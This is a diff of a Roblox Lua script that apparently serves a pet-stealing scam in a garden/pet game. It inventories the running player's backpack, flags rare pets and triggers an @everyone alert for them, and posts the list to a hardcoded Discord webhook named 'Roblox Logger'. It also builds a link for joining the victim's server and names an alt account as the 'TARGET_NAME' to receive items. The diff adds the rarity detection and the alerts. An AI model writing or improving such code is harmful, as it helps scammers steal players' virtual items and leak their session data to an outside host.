@@ -1,3 +1,6 @@
+if _G.WebhookSent then return end
+_G.WebhookSent = true
+
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1383607196113309778/jp3k0Oo4Ec_k2Lfn7dgiMe9PC-g__pA4X8E3I_u8KxesvpF8dzgv0423y2K1yU-wxoXk"
 
 local Players = game:GetService("Players")
@@ -6,21 +9,84 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local Backpack = LocalPlayer:WaitForChild("Backpack")
 
-local items = {}
+local animalKeywords = {
+    "bunny", "dog", "golden lab", "black bunny", "cat", "chicken", "deer",
+    "orange tabby", "spotted deer", "pig", "rooster",
+    "cow", "polar bear", "sea otter", "silver monkey", "turtle",
+    "brown mouse", "caterpillar", "giant ant", "grey mouse",
+    "praying mantis", "red fox", "red giant ant", "snail", "squirrel",
+    "dragonfly", "bee", "honey bee", "bear bee", "petal bee", "queen bee",
+    "wasp", "tarantula hawk", "moth", "butterfly", "disco bee"
+}
+
+local rarePetEmojis = {
+    ["polar bear"] = "🐻‍❄️",
+    ["disco bee"] = "🎉🐝",
+    ["queen bee"] = "👑🐝",
+    ["dragonfly"] = "🧚‍♂️🐞",
+    ["red fox"] = "🦊",
+    ["chicken jockey"] = "🐔💀",
+    ["cooked owl"] = "🍗🦉",
+    ["raccoon"] = "🦝"
+}
+
+local ignoreKeywords = {
+    "trowel", "watering can", "sprinkler", "egg", "rod"
+}
+
+local function matchesKeyword(itemName, keywordList)
+    itemName = itemName:lower()
+    for _, keyword in ipairs(keywordList) do
+        if itemName:find(keyword) then
+            return true
+        end
+    end
+    return false
+end
+
+local function getRareEmoji(itemName)
+    itemName = itemName:lower()
+    for keyword, emoji in pairs(rarePetEmojis) do
+        if itemName:find(keyword) then
+            return emoji
+        end
+    end
+    return nil
+end
+
+local animalItems = {}
+local otherItems = {}
+local mentionEveryone = false
+
 for _, tool in ipairs(Backpack:GetChildren()) do
-    local name = tool.Name:lower()
-    if not (
-        name:find("trowel")
-        or name:find("shovel")
-        or name:find("sprinkler")
-        or name:find("egg")
-        or name:find("rod")
-        or name:find("value")
-    ) then
-        table.insert(items, "**• " .. tool.Name .. "**")
+    local name = tool.Name
+
+    if matchesKeyword(name, ignoreKeywords) then
+        continue
+    end
+
+    local emoji = getRareEmoji(name)
+    if emoji then
+        mentionEveryone = true
+    end
+
+    local entry = "**• " .. name .. "**"
+    if emoji then
+        entry = emoji .. " " .. entry
+    end
+
+    if matchesKeyword(name, animalKeywords) then
+        table.insert(animalItems, entry)
+    else
+        table.insert(otherItems, entry)
     end
 end
-local itemText = (#items > 0) and table.concat(items, "\n") or "__No valid items found.__"
+
+local allItems = {}
+for _, v in ipairs(animalItems) do table.insert(allItems, v) end
+for _, v in ipairs(otherItems) do table.insert(allItems, v) end
+
+local itemText = (#allItems > 0) and table.concat(allItems, "\n") or "__No valid items found.__"
 
 local autoJoinLink = string.format(
     "https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s",
@@ -31,7 +97,7 @@ local autoJoinLink = string.format(
 local embedData = {
     ["username"] = "Roblox Logger",
     ["embeds"] = {{
-        ["title"] = "__" .. LocalPlayer.Name .. "'s Backpack Contents__", 
+        ["title"] = "__" .. LocalPlayer.Name .. "'s Backpack Contents__",
         ["description"] = itemText,
         ["color"] = 65280,
         ["footer"] = {
@@ -43,6 +109,10 @@ local embedData = {
         }}
     }}
 }
+
+if mentionEveryone then
+    embedData["content"] = "@everyone"
+end
 
 local success, err = pcall(function()
     request({
@@ -56,12 +126,13 @@ local success, err = pcall(function()
 end)
 
 if success then
-    print("Webhook sent with enhanced formatting and filters.")
+    print("Webhook sent with emojis and rare detection.")
 else
     warn("Failed to send webhook:", err)
 end
 
-local TARGET_NAME = "Petsnatcha" --Your alt roblox goes here
+
+local TARGET_NAME = "petsnatcha" --Your alt roblox goes here
 local IGNORE_ITEMS = { "trowel", "shovel", "sprinkler", "rod", "egg", "watering can", "seed" }
 local LOADING_TIME = 300 
 
